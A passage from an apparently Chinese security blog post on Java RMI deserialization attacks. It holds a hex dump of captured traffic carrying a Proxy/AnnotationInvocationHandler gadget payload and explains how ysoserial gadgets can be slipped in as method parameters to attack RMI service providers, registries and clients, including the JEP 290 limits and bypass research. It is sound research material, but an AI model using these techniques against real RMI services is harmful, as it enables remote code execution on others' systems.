 65 70 78 70 80 01 00 00   I..uniqu epxp....</span><br><span class="line">00000106  01 70 5d a6 5c 22 ab a0  76 97 77 08 80 00 00 00   .p].\&quot;.. v.w.....</span><br><span class="line">00000116  00 00 00 00 73 72 00 12  6a 61 76 61 2e 72 6d 69   ....sr.. java.rmi</span><br><span class="line">00000126  2e 64 67 63 2e 4c 65 61  73 65 b0 b5 e2 66 0c 4a   .dgc.Lea se...f.J</span><br><span class="line">00000136  dc 34 02 00 02 4a 00 05  76 61 6c 75 65 4c 00 04   .4...J.. valueL..</span><br><span class="line">00000146  76 6d 69 64 74 00 13 4c  6a 61 76 61 2f 72 6d 69   vmidt..L java&#x2F;rmi</span><br><span class="line">00000156  2f 64 67 63 2f 56 4d 49  44 3b 70 78 70 00 00 00   &#x2F;dgc&#x2F;VMI D;pxp...</span><br><span class="line">00000166  00 00 09 27 c0 73 72 00  11 6a 61 76 61 2e 72 6d   ...&#39;.sr. .java.rm</span><br><span class="line">00000176  69 2e 64 67 63 2e 56 4d  49 44 f8 86 5b af a4 a5   i.dgc.VM ID..[...</span><br><span class="line">00000186  6d b6 02 00 02 5b 00 04  61 64 64 72 74 00 02 5b   m....[.. addrt..[</span><br><span class="line">00000196  42 4c 00 03 75 69 64 71  00 7e 00 03 70 78 70 75   BL..uidq .~..pxpu</span><br><span class="line">000001A6  72 00 02 5b 42 ac f3 17  f8 06 08 54 e0 02 00 00   r..[B... ...T....</span><br><span class="line">000001B6  70 78 70 00 00 00 08 f7  88 3b 04 59 fc a2 27 73   pxp..... .;.Y..&#39;s</span><br><span class="line">000001C6  71 00 7e 00 05 80 01 00  00 01 70 5d aa ea e5 dd   q.~..... ..p]....</span><br><span class="line">000001D6  bd ea 1a                                           ...</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000020  5d a6 5c 22 80 05 73 72  00 12 6a 61 76 61 2e 72   ].\&quot;..sr ..java.r</span><br><span class="line">    00000030  6d 69 2e 64 67 63 2e 4c  65 61 73 65 b0 b5 e2 66   mi.dgc.L ease...f</span><br><span class="line">    00000040  0c 4a dc 34 02 00 02 4a  00 05 76 61 6c 75 65 4c   .J.4...J ..valueL</span><br><span class="line">    00000050  00 04 76 6d 69 64 74 00  13 4c 6a 61 76 61 2f 72   ..vmidt. .Ljava&#x2F;r</span><br><span class="line">    00000060  6d 69 2f 64 67 63 2f 56  4d 49 44 3b 70 78 70 00   mi&#x2F;dgc&#x2F;V MID;pxp.</span><br><span class="line">    00000070  00 00 00 00 09 27 c0 73  72 00 11 6a 61 76 61 2e   .....&#39;.s r..java.</span><br><span class="line">    00000080  72 6d 69 2e 64 67 63 2e  56 4d 49 44 f8 86 5b af   rmi.dgc. VMID..[.</span><br><span class="line">    00000090  a4 a5 6d b6 02 00 02 5b  00 04 61 64 64 72 74 00   ..m....[ ..addrt.</span><br><span class="line">    000000A0  02 5b 42 4c 00 03 75 69  64 74 00 15 4c 6a 61 76   .[BL..ui dt..Ljav</span><br><span class="line">    000000B0  61 2f 72 6d 69 2f 73 65  72 76 65 72 2f 55 49 44   a&#x2F;rmi&#x2F;se rver&#x2F;UID</span><br><span class="line">    000000C0  3b 70 78 70 75 72 00 02  5b 42 ac f3 17 f8 06 08   ;pxpur.. [B......</span><br><span class="line">    000000D0  54 e0 02 00 00 70 78 70  00 00 00 08 f7 88 3b 04   T....pxp ......;.</span><br><span class="line">    000000E0  59 fc a2 27 73 72 00 13  6a 61 76 61 2e 72 6d 69   Y..&#39;sr.. java.rmi</span><br><span class="line">    000000F0  2e 73 65 72 76 65 72 2e  55 49 44 0f 12 70 0d bf   .server. UID..p..</span><br><span class="line">    00000100  36 4f 12 02 00 03 53 00  05 63 6f 75 6e 74 4a 00   6O....S. .countJ.</span><br><span class="line">    00000110  04 74 69 6d 65 49 00 06  75 6e 69 71 75 65 70 78   .timeI.. uniquepx</span><br><span class="line">    00000120  70 80 01 00 00 01 70 5d  aa ea e5 dd bd ea 1a      p.....p] .......</span><br><span class="line">000001D9  52                                                 R</span><br><span class="line">    0000012F  53                                                 S</span><br><span class="line">000001DA  50 ac ed 00 05 77 22 27  2e 2f a2 08 49 09 8f ab   P....w&quot;&#39; .&#x2F;..I...</span><br><span class="line">000001EA  a0 76 97 00 00 01 70 5d  a6 5c 22 80 01 ff ff ff   .v....p] .\&quot;.....</span><br><span class="line">000001FA  ff d9 0d 2f 12 e0 71 7f  42 73 7d 00 00 00 01 00   ...&#x2F;..q. Bs&#125;.....</span><br><span class="line">0000020A  11 64 65 6d 6f 2e 72 6d  62 31 32 32 2e 44 75 6d   .demo.rm b122.Dum</span><br><span class="line">0000021A  6d 79 70 78 72 00 17 6a  61 76 61 2e 6c 61 6e 67   mypxr..j ava.lang</span><br><span class="line">0000022A  2e 72 65 66 6c 65 63 74  2e 50 72 6f 78 79 e1 27   .reflect .Proxy.&#39;</span><br><span class="line">0000023A  da 20 cc 10 43 cb 02 00  01 4c 00 01 68 74 00 25   . ..C... .L..ht.%</span><br><span class="line">0000024A  4c 6a 61 76 61 2f 6c 61  6e 67 2f 72 65 66 6c 65   Ljava&#x2F;la ng&#x2F;refle</span><br><span class="line">0000025A  63 74 2f 49 6e 76 6f 63  61 74 69 6f 6e 48 61 6e   ct&#x2F;Invoc ationHan</span><br><span class="line">0000026A  64 6c 65 72 3b 70 78 70  73 72 00 32 73 75 6e 2e   dler;pxp sr.2sun.</span><br><span class="line">0000027A  72 65 66 6c 65 63 74 2e  61 6e 6e 6f 74 61 74 69   reflect. annotati</span><br><span class="line">0000028A  6f 6e 2e 41 6e 6e 6f 74  61 74 69 6f 6e 49 6e 76   on.Annot ationInv</span><br><span class="line">0000029A  6f 63 61 74 69 6f 6e 48  61 6e 64 6c 65 72 55 ca   ocationH andlerU.</span><br><span class="line">000002AA  f5 0f 15 cb 7e a5 02 00  02 4c 00 0c 6d 65 6d 62   ....~... .L..memb</span><br><span class="line">000002BA  65 72 56 61 6c 75 65 73  74 00 0f 4c 6a 61 76 61   erValues t..Ljava</span><br><span class="line">000002CA  2f 75 74 69 6c 2f 4d 61  70 3b 4c 00 04 74 79 70   &#x2F;util&#x2F;Ma p;L..typ</span><br><span class="line">000002DA  65 74 00 11 4c 6a 61 76  61 2f 6c 61 6e 67 2f 43   et..Ljav a&#x2F;lang&#x2F;C</span><br><span class="line">000002EA  6c 61 73 73 3b 70 78 70  73 72 00 11 6a 61 76 61   lass;pxp sr..java</span><br><span class="line">000002FA  2e 75 74 69 6c 2e 48 61  73 68 4d 61 70 05 07 da   .util.Ha shMap...</span><br><span class="line">0000030A  c1 c3 16 60 d1 03 00 02  46 00 0a 6c 6f 61 64 46   ...&#96;.... F..loadF</span><br><span class="line">0000031A  61 63 74 6f 72 49 00 09  74 68 72 65 73 68 6f 6c   actorI.. threshol</span><br><span class="line">0000032A  64 70 78 70 3f 40 00 00  00 00 00 0c 77 08 00 00   dpxp?@.. ....w...</span><br><span class="line">0000033A  00 10 00 00 00 01 74 00  03 61 61 61 73 72 00 1d   ......t. .aaasr..</span><br><span class="line">0000034A  64 65 6d 6f 2e 72 6d 62  31 32 32 2e 44 65 73 65   demo.rmb 122.Dese</span><br><span class="line">0000035A  72 69 61 6c 69 7a 65 4f  62 6a 65 63 74 e7 b9 28   rializeO bject..(</span><br><span class="line">0000036A  12 38 24 61 0c 02 00 00  70 78 70 78 76 72 00 14   .8$a.... pxpxvr..</span><br><span class="line">0000037A  6a 61 76 61 2e 6c 61 6e  67 2e 44 65 70 72 65 63   java.lan g.Deprec</span><br><span class="line">0000038A  61 74 65 64 00 00 00 00  00 00 00 00 00 00 00 70   ated.... .......p</span><br><span class="line">0000039A  78 70                                              xp</span><br><span class="line">    00000130  51 ac ed 00 05 77 0f 02  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000140  5d a6 5c 22 80 06 73 72  00 1e 6a 61 76 61 2e 6c   ].\&quot;..sr ..java.l</span><br><span class="line">    00000150  61 6e 67 2e 4e 75 6c 6c  50 6f 69 6e 74 65 72 45   ang.Null PointerE</span><br><span class="line">    00000160  78 63 65 70 74 69 6f 6e  47 a5 a1 8e ff 31 e1 b8   xception G....1..</span><br><span class="line">    00000170  02 00 00 70 78 72 00 1a  6a 61 76 61 2e 6c 61 6e   ...pxr.. java.lan</span><br><span class="line">    00000180  67 2e 52 75 6e 74 69 6d  65 45 78 63 65 70 74 69   g.Runtim eExcepti</span><br><span class="line">    00000190  6f 6e 9e 5f 06 47 0a 34  83 e5 02 00 00 70 78 72   on._.G.4 .....pxr</span><br><span class="line">    000001A0  00 13 6a 61 76 61 2e 6c  61 6e 67 2e 45 78 63 65   ..java.l ang.Exce</span><br><span class="line">    000001B0  70 74 69 6f 6e d0 fd 1f  3e 1a 3b 1c c4 02 00 00   ption... &gt;.;.....</span><br><span class="line">    000001C0  70 78 72 00 13 6a 61 76  61 2e 6c 61 6e 67 2e 54   pxr..jav a.lang.T</span><br><span class="line">    000001D0  68 72 6f 77 61 62 6c 65  d5 c6 35 27 39 77 b8 cb   hrowable ..5&#39;9w..</span><br><span class="line">    000001E0  03 00 04 4c 00 05 63 61  75 73 65 74 00 15 4c 6a   ...L..ca uset..Lj</span><br><span class="line">    000001F0  61 76 61 2f 6c 61 6e 67  2f 54 68 72 6f 77 61 62   ava&#x2F;lang &#x2F;Throwab</span><br><span class="line">    00000200  6c 65 3b 4c 00 0d 64 65  74 61 69 6c 4d 65 73 73   le;L..de tailMess</span><br><span class="line">    00000210  61 67 65 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67   aget..Lj ava&#x2F;lang</span><br><span class="line">    00000220  2f 53 74 72 69 6e 67 3b  5b 00 0a 73 74 61 63 6b   &#x2F;String; [..stack</span><br><span class="line">    00000230  54 72 61 63 65 74 00 1e  5b 4c 6a 61 76 61 2f 6c   Tracet.. [Ljava&#x2F;l</span><br><span class="line">    00000240  61 6e 67 2f 53 74 61 63  6b 54 72 61 63 65 45 6c   ang&#x2F;Stac kTraceEl</span><br><span class="line">    00000250  65 6d 65 6e 74 3b 4c 00  14 73 75 70 70 72 65 73   ement;L. .suppres</span><br><span class="line">    00000260  73 65 64 45 78 63 65 70  74 69 6f 6e 73 74 00 10   sedExcep tionst..</span><br><span class="line">    00000270  4c 6a 61 76 61 2f 75 74  69 6c 2f 4c 69 73 74 3b   Ljava&#x2F;ut il&#x2F;List;</span><br><span class="line">    00000280  70 78 70 71 00 7e 00 08  70 75 72 00 1e 5b 4c 6a   pxpq.~.. pur..[Lj</span><br><span class="line">    00000290  61 76 61 2e 6c 61 6e 67  2e 53 74 61 63 6b 54 72   ava.lang .StackTr</span><br><span class="line">    000002A0  61 63 65 45 6c 65 6d 65  6e 74 3b 02 46 2a 3c 3c   aceEleme nt;.F*&lt;&lt;</span><br><span class="line">    000002B0  fd 22 39 02 00 00 70 78  70 00 00 00 17 73 72 00   .&quot;9...px p....sr.</span><br><span class="line">    000002C0  1b 6a 61 76 61 2e 6c 61  6e 67 2e 53 74 61 63 6b   .java.la ng.Stack</span><br><span class="line">    000002D0  54 72 61 63 65 45 6c 65  6d 65 6e 74 61 09 c5 9a   TraceEle menta...</span><br><span class="line">    000002E0  26 36 dd 85 02 00 08 42  00 06 66 6f 72 6d 61 74   &amp;6.....B ..format</span><br><span class="line">    000002F0  49 00 0a 6c 69 6e 65 4e  75 6d 62 65 72 4c 00 0f   I..lineN umberL..</span><br><span class="line">    00000300  63 6c 61 73 73 4c 6f 61  64 65 72 4e 61 6d 65 71   classLoa derNameq</span><br><span class="line">    00000310  00 7e 00 05 4c 00 0e 64  65 63 6c 61 72 69 6e 67   .~..L..d eclaring</span><br><span class="line">    00000320  43 6c 61 73 73 71 00 7e  00 05 4c 00 08 66 69 6c   Classq.~ ..L..fil</span><br><span class="line">    00000330  65 4e 61 6d 65 71 00 7e  00 05 4c 00 0a 6d 65 74   eNameq.~ ..L..met</span><br><span class="line">    00000340  68 6f 64 4e 61 6d 65 71  00 7e 00 05 4c 00 0a 6d   hodNameq .~..L..m</span><br><span class="line">    00000350  6f 64 75 6c 65 4e 61 6d  65 71 00 7e 00 05 4c 00   oduleNam eq.~..L.</span><br><span class="line">    00000360  0d 6d 6f 64 75 6c 65 56  65 72 73 69 6f 6e 71 00   .moduleV ersionq.</span><br><span class="line">    00000370  7e 00 05 70 78 70 02 00  00 00 a6 70 74 00 32 73   ~..pxp.. ...pt.2s</span><br><span class="line">    00000380  75 6e 2e 72 65 66 6c 65  63 74 2e 61 6e 6e 6f 74   un.refle ct.annot</span><br><span class="line">    00000390  61 74 69 6f 6e 2e 41 6e  6e 6f 74 61 74 69 6f 6e   ation.An notation</span><br><span class="line">    000003A0  49 6e 76 6f 63 61 74 69  6f 6e 48 61 6e 64 6c 65   Invocati onHandle</span><br><span class="line">    000003B0  72 74 00 20 41 6e 6e 6f  74 61 74 69 6f 6e 49 6e   rt. Anno tationIn</span><br><span class="line">    000003C0  76 6f 63 61 74 69 6f 6e  48 61 6e 64 6c 65 72 2e   vocation Handler.</span><br><span class="line">    000003D0  6a 61 76 61 74 00 13 6d  65 6d 62 65 72 56 61 6c   javat..m emberVal</span><br><span class="line">    000003E0  75 65 54 6f 53 74 72 69  6e 67 74 00 09 6a 61 76   ueToStri ngt..jav</span><br><span class="line">    000003F0  61 2e 62 61 73 65 74 00  06 31 31 2e 30 2e 36 73   a.baset. .11.0.6s</span><br><span class="line">    00000400  71 00 7e 00 0b 02 00 00  00 9c 70 71 00 7e 00 0d   q.~..... ..pq.~..</span><br><span class="line">    00000410  71 00 7e 00 0e 74 00 0c  74 6f 53 74 72 69 6e 67   q.~..t.. toString</span><br><span class="line">    00000420  49 6d 70 6c 71 00 7e 00  10 71 00 7e 00 11 73 71   Implq.~. .q.~..sq</span><br><span class="line">    00000430  00 7e 00 0b 02 00 00 00  48 70 71 00 7e 00 0d 71   .~...... Hpq.~..q</span><br><span class="line">    00000440  00 7e 00 0e 74 00 06 69  6e 76 6f 6b 65 71 00 7e   .~..t..i nvokeq.~</span><br><span class="line">    00000450  00 10 71 00 7e 00 11 73  71 00 7e 00 0b 01 ff ff   ..q.~..s q.~.....</span><br><span class="line">    00000460  ff ff 74 00 03 61 70 70  74 00 15 63 6f 6d 2e 73   ..t..app t..com.s</span><br><span class="line">    00000470  75 6e 2e 70 72 6f 78 79  2e 24 50 72 6f 78 79 31   un.proxy .$Proxy1</span><br><span class="line">    00000480  70 74 00 08 74 6f 53 74  72 69 6e 67 70 70 73 71   pt..toSt ringppsq</span><br><span class="line">    00000490  00 7e 00 0b 02 00 00 0b  87 70 74 00 10 6a 61 76   .~...... .pt..jav</span><br><span class="line">    000004A0  61 2e 6c 61 6e 67 2e 53  74 72 69 6e 67 74 00 0b   a.lang.S tringt..</span><br><span class="line">    000004B0  53 74 72 69 6e 67 2e 6a  61 76 61 74 00 07 76 61   String.j avat..va</span><br><span class="line">    000004C0  6c 75 65 4f 66 71 00 7e  00 10 71 00 7e 00 11 73   lueOfq.~ ..q.~..s</span><br><span class="line">    000004D0  71 00 7e 00 0b 01 00 00  00 06 71 00 7e 00 17 74   q.~..... ..q.~..t</span><br><span class="line">    000004E0  00 1a 64 65 6d 6f 2e 72  6d 62 31 32 32 2e 54 65   ..demo.r mb122.Te</span><br><span class="line">    000004F0  73 74 4f 62 6a 65 63 74  49 6d 70 6c 74 00 13 54   stObject Implt..T</span><br><span class="line">    00000500  65 73 74 4f 62 6a 65 63  74 49 6d 70 6c 2e 6a 61   estObjec tImpl.ja</span><br><span class="line">    00000510  76 61 74 00 06 63 61 6c  6c 4d 65 70 70 73 71 00   vat..cal lMeppsq.</span><br><span class="line">    00000520  7e 00 0b 02 ff ff ff fe  70 74 00 2d 6a 64 6b 2e   ~....... pt.-jdk.</span><br><span class="line">    00000530  69 6e 74 65 72 6e 61 6c  2e 72 65 66 6c 65 63 74   internal .reflect</span><br><span class="line">    00000540  2e 4e 61 74 69 76 65 4d  65 74 68 6f 64 41 63 63   .NativeM ethodAcc</span><br><span class="line">    00000550  65 73 73 6f 72 49 6d 70  6c 74 00 1d 4e 61 74 69   essorImp lt..Nati</span><br><span class="line">    00000560  76 65 4d 65 74 68 6f 64  41 63 63 65 73 73 6f 72   veMethod Accessor</span><br><span class="line">    00000570  49 6d 70 6c 2e 6a 61 76  61 74 00 07 69 6e 76 6f   Impl.jav at..invo</span><br><span class="line">    00000580  6b 65 30 71 00 7e 00 10  71 00 7e 00 11 73 71 00   ke0q.~.. q.~..sq.</span><br><span class="line">    00000590  7e 00 0b 02 00 00 00 3e  70 71 00 7e 00 23 71 00   ~......&gt; pq.~.#q.</span><br><span class="line">    000005A0  7e 00 24 71 00 7e 00 15  71 00 7e 00 10 71 00 7e   ~.$q.~.. q.~..q.~</span><br><span class="line">    000005B0  00 11 73 71 00 7e 00 0b  02 00 00 00 2b 70 74 00   ..sq.~.. ....+pt.</span><br><span class="line">    000005C0  31 6a 64 6b 2e 69 6e 74  65 72 6e 61 6c 2e 72 65   1jdk.int ernal.re</span><br><span class="line">    000005D0  66 6c 65 63 74 2e 44 65  6c 65 67 61 74 69 6e 67   flect.De legating</span><br><span class="line">    000005E0  4d 65 74 68 6f 64 41 63  63 65 73 73 6f 72 49 6d   MethodAc cessorIm</span><br><span class="line">    000005F0  70 6c 74 00 21 44 65 6c  65 67 61 74 69 6e 67 4d   plt.!Del egatingM</span><br><span class="line">    00000600  65 74 68 6f 64 41 63 63  65 73 73 6f 72 49 6d 70   ethodAcc essorImp</span><br><span class="line">    00000610  6c 2e 6a 61 76 61 71 00  7e 00 15 71 00 7e 00 10   l.javaq. ~..q.~..</span><br><span class="line">    00000620  71 00 7e 00 11 73 71 00  7e 00 0b 02 00 00 02 36   q.~..sq. ~......6</span><br><span class="line">    00000630  70 74 00 18 6a 61 76 61  2e 6c 61 6e 67 2e 72 65   pt..java .lang.re</span><br><span class="line">    00000640  66 6c 65 63 74 2e 4d 65  74 68 6f 64 74 00 0b 4d   flect.Me thodt..M</span><br><span class="line">    00000650  65 74 68 6f 64 2e 6a 61  76 61 71 00 7e 00 15 71   ethod.ja vaq.~..q</span><br><span class="line">    00000660  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000670  00 00 01 67 70 74 00 1f  73 75 6e 2e 72 6d 69 2e   ...gpt.. sun.rmi.</span><br><span class="line">    00000680  73 65 72 76 65 72 2e 55  6e 69 63 61 73 74 53 65   server.U nicastSe</span><br><span class="line">    00000690  72 76 65 72 52 65 66 74  00 15 55 6e 69 63 61 73   rverReft ..Unicas</span><br><span class="line">    000006A0  74 53 65 72 76 65 72 52  65 66 2e 6a 61 76 61 74   tServerR ef.javat</span><br><span class="line">    000006B0  00 08 64 69 73 70 61 74  63 68 74 00 08 6a 61 76   ..dispat cht..jav</span><br><span class="line">    000006C0  61 2e 72 6d 69 71 00 7e  00 11 73 71 00 7e 00 0b   a.rmiq.~ ..sq.~..</span><br><span class="line">    000006D0  02 00 00 00 c8 70 74 00  1d 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000006E0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000006F0  70 6f 72 74 24 31 74 00  0e 54 72 61 6e 73 70 6f   port$1t. .Transpo</span><br><span class="line">    00000700  72 74 2e 6a 61 76 61 74  00 03 72 75 6e 71 00 7e   rt.javat ..runq.~</span><br><span class="line">    00000710  00 31 71 00 7e 00 11 73  71 00 7e 00 0b 02 00 00   .1q.~..s q.~.....</span><br><span class="line">    00000720  00 c5 70 71 00 7e 00 33  71 00 7e 00 34 71 00 7e   ..pq.~.3 q.~.4q.~</span><br><span class="line">    00000730  00 35 71 00 7e 00 31 71  00 7e 00 11 73 71 00 7e   .5q.~.1q .~..sq.~</span><br><span class="line">    00000740  00 0b 02 ff ff ff fe 70  74 00 1e 6a 61 76 61 2e   .......p t..java.</span><br><span class="line">    00000750  73 65 63 75 72 69 74 79  2e 41 63 63 65 73 73 43   security .AccessC</span><br><span class="line">    00000760  6f 6e 74 72 6f 6c 6c 65  72 74 00 15 41 63 63 65   ontrolle rt..Acce</span><br><span class="line">    00000770  73 73 43 6f 6e 74 72 6f  6c 6c 65 72 2e 6a 61 76   ssContro ller.jav</span><br><span class="line">    00000780  61 74 00 0c 64 6f 50 72  69 76 69 6c 65 67 65 64   at..doPr ivileged</span><br><span class="line">    00000790  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000007A0  02 00 00 00 c4 70 74 00  1b 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000007B0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000007C0  70 6f 72 74 71 00 7e 00  34 74 00 0b 73 65 72 76   portq.~. 4t..serv</span><br><span class="line">    000007D0  69 63 65 43 61 6c 6c 71  00 7e 00 31 71 00 7e 00   iceCallq .~.1q.~.</span><br><span class="line">    000007E0  11 73 71 00 7e 00 0b 02  00 00 02 32 70 74 00 22   .sq.~... ...2pt.&quot;</span><br><span class="line">    000007F0  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000800  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000810  72 74 74 00 11 54 43 50  54 72 61 6e 73 70 6f 72   rtt..TCP Transpor</span><br><span class="line">    00000820  74 2e 6a 61 76 61 74 00  0e 68 61 6e 64 6c 65 4d   t.javat. .handleM</span><br><span class="line">    00000830  65 73 73 61 67 65 73 71  00 7e 00 31 71 00 7e 00   essagesq .~.1q.~.</span><br><span class="line">    00000840  11 73 71 00 7e 00 0b 02  00 00 03 1c 70 74 00 34   .sq.~... ....pt.4</span><br><span class="line">    00000850  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000860  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000870  72 74 24 43 6f 6e 6e 65  63 74 69 6f 6e 48 61 6e   rt$Conne ctionHan</span><br><span class="line">    00000880  64 6c 65 72 71 00 7e 00  40 74 00 04 72 75 6e 30   dlerq.~. @t..run0</span><br><span class="line">    00000890  71 00 7e 00 31 71 00 7e  00 11 73 71 00 7e 00 0b   q.~.1q.~ ..sq.~..</span><br><span class="line">    000008A0  02 00 00 02 a5 70 71 00  7e 00 43 71 00 7e 00 40   .....pq. ~.Cq.~.@</span><br><span class="line">    000008B0  74 00 0c 6c 61 6d 62 64  61 24 72 75 6e 24 30 71   t..lambd a$run$0q</span><br><span class="line">    000008C0  00 7e 00 31 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~.1q.~. .sq.~...</span><br><span class="line">    000008D0  ff ff ff fe 70 71 00 7e  00 38 71 00 7e 00 39 71   ....pq.~ .8q.~.9q</span><br><span class="line">    000008E0  00 7e 00 3a 71 00 7e 00  10 71 00 7e 00 11 73 71   .~.:q.~. .q.~..sq</span><br><span class="line">    000008F0  00 7e 00 0b 02 00 00 02  a4 70 71 00 7e 00 43 71   .~...... .pq.~.Cq</span><br><span class="line">    00000900  00 7e 00 40 71 00 7e 00  35 71 00 7e 00 31 71 00   .~.@q.~. 5q.~.1q.</span><br><span class="line">    00000910  7e 00 11 73 71 00 7e 00  0b 02 00 00 04 68 70 74   ~..sq.~. .....hpt</span><br><span class="line">    00000920  00 27 6a 61 76 61 2e 75  74 69 6c 2e 63 6f 6e 63   .&#39;java.u til.conc</span><br><span class="line">    00000930  75 72 72 65 6e 74 2e 54  68 72 65 61 64 50 6f 6f   urrent.T hreadPoo</span><br><span class="line">    00000940  6c 45 78 65 63 75 74 6f  72 74 00 17 54 68 72 65   lExecuto rt..Thre</span><br><span class="line">    00000950  61 64 50 6f 6f 6c 45 78  65 63 75 74 6f 72 2e 6a   adPoolEx ecutor.j</span><br><span class="line">    00000960  61 76 61 74 00 09 72 75  6e 57 6f 72 6b 65 72 71   avat..ru nWorkerq</span><br><span class="line">    00000970  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000980  00 00 02 74 70 74 00 2e  6a 61 76 61 2e 75 74 69   ...tpt.. java.uti</span><br><span class="line">    00000990  6c 2e 63 6f 6e 63 75 72  72 65 6e 74 2e 54 68 72   l.concur rent.Thr</span><br><span class="line">    000009A0  65 61 64 50 6f 6f 6c 45  78 65 63 75 74 6f 72 24   eadPoolE xecutor$</span><br><span class="line">    000009B0  57 6f 72 6b 65 72 71 00  7e 00 4b 71 00 7e 00 35   Workerq. ~.Kq.~.5</span><br><span class="line">    000009C0  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000009D0  02 00 00 03 42 70 74 00  10 6a 61 76 61 2e 6c 61   ....Bpt. .java.la</span><br><span class="line">    000009E0  6e 67 2e 54 68 72 65 61  64 74 00 0b 54 68 72 65   ng.Threa dt..Thre</span><br><span class="line">    000009F0  61 64 2e 6a 61 76 61 71  00 7e 00 35 71 00 7e 00   ad.javaq .~.5q.~.</span><br><span class="line">    00000A00  10 71 00 7e 00 11 73 72  00 1f 6a 61 76 61 2e 75   .q.~..sr ..java.u</span><br><span class="line">    00000A10  74 69 6c 2e 43 6f 6c 6c  65 63 74 69 6f 6e 73 24   til.Coll ections$</span><br><span class="line">    00000A20  45 6d 70 74 79 4c 69 73  74 7a b8 17 b4 3c a7 9e   EmptyLis tz...&lt;..</span><br><span class="line">    00000A30  de 02 00 00 70 78 70 78                            ....pxpx</span><br></pre></td></tr></table></figure>

<p>看到一堆 <code>ac ed 00 05</code>, 就可以证明漏洞的来源了, 原因就是 RMI 协议是基于 java 自带的序列化的. 如果参数类型是 Object, 直接传 payload 就行了. 如果不是 Object 但是是类型是接口, 我们可以通过 Proxy 给 ysoseiral 的 payload 套一层, 也能直接打服务端. 不过比较麻烦的是 java 的动态代理只能代理 Interface, 所以如果形参类型是 String, HashMap 等就没办法了. 另外可以看到异常 <code>java.lang.NullPointerException</code> 是服务提供者发给客户端的, 好像有通过这种方式回显消息的打法, 也是很骚的.  </p>
<p>另外实际以前上在 bind 给 <code>Registry</code> 等等地方都是可以打的 (ysoseiral 也有对应的 payload), 因为也都是通过反序列化传数据, 不过在一次更新中 java 官方加了限制 (可以看参考文文章 [7]). 在这种地方只能反序列化在白名单里面的类, 不过仍然找到了通过 JRMPClient 的方法来打. 可惜的是最新版本我测试的情况是 JRMPClient 也给修复了, 可以收到 Registry 发的 JRMP 请求, 但是不能成功反序列化, 甚至连异常都没有, 估计仍然是白名单过滤掉了. 所以这方面目前只能通过我上面的说的参数方式来反序列化打服务提供者了.  </p>
<p>大概是打客户端:<br>直接改 ysoseiral.exploit.JRMPListener.java, 返回恶意 gadgets 即可, 这在 JNDI lookup 都时候也可以用.  </p>
<p>打注册局:<br>用 ysoseiral.exploit.RMIRegistryExploit.java + 略微修改过的 ysoseiral.exploit.JRMPClient.java.  </p>
<p>打服务提供者:<br>把参数用恶意对象替换就可以了, 对参数类型有限制.  </p>
<p>Update:<br>看到了国外的研究, <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a>  </p>
<p>可以通过 hook 类方法来直接更改传过去的参数, 绕过部分的限制.  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readByte();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readChar();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readShort();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> 